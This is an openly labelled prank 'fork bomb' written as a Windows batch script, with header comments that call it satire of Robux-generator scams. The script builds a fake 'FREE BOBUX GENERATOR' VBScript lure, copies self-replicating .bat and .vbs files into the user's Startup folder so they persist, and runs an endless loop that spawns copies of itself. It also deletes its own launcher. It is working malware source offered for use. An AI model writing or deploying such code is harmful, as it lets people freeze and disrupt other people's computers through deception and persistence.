REM Fork Bomb made by Sirapol B. on 11 October 2022
REM Made for creating anxiety without much harm (I guess lol)
REM This fork bomb is kinda a satire on those "Free Robux generator" websites on the internet
REM Input "SrpB" in any of the input boxes to stop the process
REM Make sure to delete AmogusBomb.bat and AmogusBomb.vbs inside Startup directory or else the problem will not be gone
REM Written in Batch
REM VirusTotal: https://www.virustotal.com/gui/file/2ade4ee024fcf9f4cec5b5640467693083b1cb52bb86955b102ccfc9fb503c11

@echo off
cls
echo hi
echo %USERNAME%

echo %APPDATA%

SET StartupDir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

REM @echo a = MsgBox^("ha ha ha ha ha ha ha",0,"you are an idiot! " ^& Round^(1.07909^^100^)^)

(
@echo dim r
@echo randomize
@echo r = int^(rnd*25000^) + 1
@echo r2 = int^(rnd*12500^) + 1
@echo Title = "FREE BOBUX GENERATOR " ^& Round^(1.07909^^100^)
@echo DefaultValueText = "Input amount of BOBUX you want!!!! :D"
@echo message = "WORKING 2022 NO DOWNLOAD!!!!!"
@echo XPos = r
@echo YPos = r2
@echo Text = InputBox^(message,Title,DefaultValueText,XPos,YPos^)
@echo If Text="SrpB" Then
@echo Set oShell = WScript.CreateObject ^("WScript.Shell"^)
@echo oShell.run "taskkill /f /im wscript.exe"
@echo oShell.run "taskkill /f /im cmd.exe"
@echo End If
) > AmogusBomb.vbs
move AmogusBomb.vbs "%StartupDir%"

REM The main bomb
(
@echo @echo off
@echo cls
@echo echo Please verify you are a human by downloading viruses and doing phishing surveys!!
@echo :spam
@echo start AmogusBomb.vbs
@echo start %%0
@echo goto spam
) > AmogusBomb.bat
move AmogusBomb.bat "%StartupDir%"

REM Create intro msgbox here
(
@echo x=msgbox^("Press OK for FREE BOBUX!!!!!" ,1, "FREE BOBUX GENERATOR 2022"^)
@echo Select Case x
@echo Case 1
@echo Dim sInput
@echo sInput = InputBox^("How much bobux do you want?"^)
@echo Set shell = CreateObject^("WScript.Shell"^) : shell.CurrentDirectory = "%StartupDir%"
@echo shell.Run "AmogusBomb.bat"
@echo End Select
@echo Set oFso = CreateObject^("Scripting.FileSystemObject"^) : oFso.DeleteFile Wscript.ScriptFullName, True
) > GENERATOR.vbs

start GENERATOR.vbs
